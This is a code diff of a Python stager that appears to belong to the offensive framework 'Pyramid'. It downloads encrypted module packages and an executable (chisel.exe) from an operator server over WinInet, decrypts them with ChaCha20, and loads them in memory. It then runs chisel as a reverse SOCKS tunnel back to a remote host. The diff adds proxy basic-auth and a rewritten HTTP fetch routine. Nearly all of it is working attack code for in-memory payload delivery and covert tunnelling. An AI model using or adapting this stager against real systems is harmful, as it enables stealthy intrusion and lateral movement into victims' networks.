@@ -34,7 +34,9 @@ import time
 ### AUTO-GENERATED PYRAMID CONFIG ### DELIMITER
 
 pyramid_server='192.168.1.2'
-pyramid_port='80'
+pyramid_port='8080'
+pyramid_user='user'
+pyramid_pass='pass'
 encryption='chacha20'
 encryptionpass='superpass'
 chacha20IV=b'12345678'
@@ -49,93 +51,117 @@ encode_encrypt_url='/login/'
 ### PYTHONMEMORYMODULE CONFIG
 
 inject_exe= True # set to False if you want to inject a dll instead
-exe_name='chisel.exe' # executable name to inject - put into Delivery_folder
-command=' client 192.168.1.2:8000 R:socks' # put a trailing space before the commandline.
+exe_name='chisel.exe' # executable name to inject
+command=' client 192.168.178.86:8000 R:socks' # put a trailing space before the commandline.
 dll_name = 'example.dll'
 dll_procedure='StartW' # dll procedure name to be called for dll execution - know your payload!
 
 ### GENERAL CONFIG ####
 
 ### Directory to which extract dependencies
-### setting to false extract to current directory
+### setting to false extracts to current directory
+
 extraction_dir=False
 
 #### DO NOT CHANGE BELOW THIS LINE #####
 
 wininet = ctypes.WinDLL('wininet.dll')
 
-# constants
-INTERNET_PORT = ctypes.c_ushort
-INTERNET_OPEN_TYPE_DIRECT = 1
+# Constants
+INTERNET_OPEN_TYPE_PRECONFIG = 0
 INTERNET_FLAG_RELOAD = 0x80000000
+INTERNET_SERVICE_HTTP = 3
 HTTP_QUERY_STATUS_CODE = 19
-HTTP_QUERY_CONTENT_LENGTH = 5
 
-# function prototypes
+# Function Prototypes
 wininet.InternetOpenW.restype = wintypes.HANDLE
 wininet.InternetOpenW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD]
 
 wininet.InternetConnectW.restype = wintypes.HANDLE
-wininet.InternetConnectW.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, INTERNET_PORT, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
+wininet.InternetConnectW.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, wintypes.INT, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.DWORD]
 
 wininet.HttpOpenRequestW.restype = wintypes.HANDLE
-wininet.HttpOpenRequestW.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR, ctypes.POINTER(wintypes.LPCWSTR), wintypes.DWORD, ctypes.c_void_p]
+wininet.HttpOpenRequestW.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR, wintypes.LPCWSTR, POINTER(wintypes.LPCWSTR), wintypes.DWORD, wintypes.DWORD]
 
 wininet.HttpSendRequestW.restype = wintypes.BOOL
 wininet.HttpSendRequestW.argtypes = [wintypes.HANDLE, wintypes.LPCWSTR, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD]
 
-wininet.InternetReadFile.restype = wintypes.BOOL
-wininet.InternetReadFile.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]
+wininet.InternetCloseHandle.restype = wintypes.BOOL
+wininet.InternetCloseHandle.argtypes = [wintypes.HANDLE]
 
-hInternet = wininet.InternetOpenW(user_agent, INTERNET_OPEN_TYPE_DIRECT, None, None, 0)
+def add_basic_auth_header(hRequest):
+    if pyramid_user:
+        credentials = f"{pyramid_user}:{pyramid_pass}".encode("utf-8")
+        base64_credentials = base64.b64encode(credentials).decode("utf-8")
+        auth_header = f"Authorization: Basic {base64_credentials}\r\n"
+        lpHeaders = ctypes.c_wchar_p(auth_header)
+        dwHeadersLength = len(auth_header)
+        wininet.HttpAddRequestHeadersW(hRequest, lpHeaders, dwHeadersLength, 0)
+       
+def http_proxy_connection(target_url):
+    print(pyramid_server)
+    print(target_url)
+    
+    hInternet = wininet.InternetOpenW(user_agent, INTERNET_OPEN_TYPE_PRECONFIG, None, None, 0)
+    if not hInternet:
+        print("Failed to open internet session.")
+        return False
 
-# WinInet parameters
-server_name = pyramid_server
-port = pyramid_port
-http_method = "GET"
-URL = ""  # The URL path to the resource
+    hConnect = wininet.InternetConnectW(hInternet, pyramid_server, int(pyramid_port), None, None, INTERNET_SERVICE_HTTP, 0, 0)
+    if not hConnect:
+        print(f"Failed to connect to target server: {pyramid_server}.")
+        wininet.InternetCloseHandle(hInternet)
+        return False
+    
+    hRequest = wininet.HttpOpenRequestW(hConnect, "GET", target_url, None, None, None, INTERNET_FLAG_RELOAD, 0)
+    if not hRequest:
+        print("Failed to open HTTP request.")
+        wininet.InternetCloseHandle(hConnect)
+        wininet.InternetCloseHandle(hInternet)
+        return False
+    
+    add_basic_auth_header(hRequest)
+    
+    if not wininet.HttpSendRequestW(hRequest, None, 0, None, 0):
+        print("Failed to send HTTP request.")
+        wininet.InternetCloseHandle(hRequest)
+        wininet.InternetCloseHandle(hConnect)
+        wininet.InternetCloseHandle(hInternet)
+        return False
+    
+    print("HTTP request sent successfully.")
+   
+    BUFFER_SIZE = 4096
+    dwBytesRead = wintypes.DWORD(0)
+    response = []
 
-def WininetHTTPWrapper(server,port, http_method, URL):
-	print(URL)
-	# returns the byte object got from the request
-	hConnect = wininet.InternetConnectW(hInternet, server_name, int(port), None, None, 3, 0, 0)
-	if not hConnect:
-		wininet.InternetCloseHandle(hInternet)
-		raise Exception("InternetConnect failed")
-	hRequest = wininet.HttpOpenRequestW(hConnect, http_method, URL, None, None, None, INTERNET_FLAG_RELOAD, 0)
+    buffer = create_string_buffer(BUFFER_SIZE)
+    while True:
+        if not wininet.InternetReadFile(hRequest, buffer, BUFFER_SIZE, byref(dwBytesRead)):
+            break
 
-	if not hRequest:
-		wininet.InternetCloseHandle(hConnect)
-		wininet.InternetCloseHandle(hInternet)
-		raise Exception("HttpOpenRequest failed")
+        if dwBytesRead.value == 0:
+            # end of the response
+            break
 
-	# Send the request
-	if not wininet.HttpSendRequestW(hRequest, None, 0, None, 0):
-		wininet.InternetCloseHandle(hRequest)
-		wininet.InternetCloseHandle(hConnect)
-		wininet.InternetCloseHandle(hInternet)
-		raise Exception("HttpSendRequest failed")
+        # Append the data read to the response list
+        response.append(buffer[:dwBytesRead.value])
+        
+    payload = b''.join(response)
 
-	# Buffer and variable to store the response
-	BUFFER_SIZE = 4096
-	dwBytesRead = wintypes.DWORD(0)
-	response = []
+    
+    wininet.InternetCloseHandle(hRequest)
+    wininet.InternetCloseHandle(hConnect)
+    wininet.InternetCloseHandle(hInternet)
+    
+    if len(payload) < 10000:
+        print("[!] Error, response too small - this may be a server error (missing file, server not reachable, etc.)")
+        print("[!] DEBUG response first 500 bytes:")
+        print(payload[:500])
+        return False
+    else:
+	    return payload
 
-	# Read the response
-	buffer = create_string_buffer(BUFFER_SIZE)
-	while True:
-		if not wininet.InternetReadFile(hRequest, buffer, BUFFER_SIZE, byref(dwBytesRead)):
-			break
-
-		if dwBytesRead.value == 0:
-			# end of the response
-			break
-		# Append the data read to the response list
-		response.append(buffer[:dwBytesRead.value])
-	# Convert the list of bytes to a single bytes object
-	payload = b''.join(response)
-		
-	return payload
 
 
 ### ChaCha encryption stub - reduced rounds for performance
@@ -362,15 +388,16 @@ def hook_routine(fileName,zip_web):
 
 ### separator --- is used by Pyramid server to look into the specified dependency folder
 
+
 zip_list = [
-	'pythonmemorymodule_opsec---pythonmemorymodule_opsec', 'pythonmemorymodule_opsec---windows_opsec'
+	'pythonmemorymodule_wininet---pythonmemorymodule_wininet', 'pythonmemorymodule_wininet---windows_wininet'
 ]
 
 
 for zip_name in zip_list: 
 	try:
 		print("[*] Loading in memory module package: " + (zip_name.split('---')[-1] if '---' in zip_name else zip_name) )
-		zip_web = WininetHTTPWrapper(pyramid_server,pyramid_port, http_method, encode_encrypt_url + base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'))
+		zip_web = http_proxy_connection(encode_encrypt_url + base64.b64encode((encrypt_wrapper((zip_name+'.zip').encode(), encryption))).decode('utf-8'))
 		print("[*] Decrypting received file") 
 		zip_web= encrypt_wrapper(zip_web, encryption)
 		hook_routine(zip_name, zip_web)
@@ -387,7 +414,7 @@ import pythonmemorymodule
 try:
 	PE_name = exe_name if inject_exe else dll_name
 	print("[*] Downloading " + PE_name + " from host " + pyramid_server)
-	buf = WininetHTTPWrapper(pyramid_server,pyramid_port, http_method, encode_encrypt_url + \
+	buf = http_proxy_connection(encode_encrypt_url + \
 		  base64.b64encode((encrypt_wrapper(('delivery_files---'+ PE_name).encode(), encryption))).decode('utf-8'))
 	buf= encrypt_wrapper(buf,encryption)
 	if len(buf) ==0:
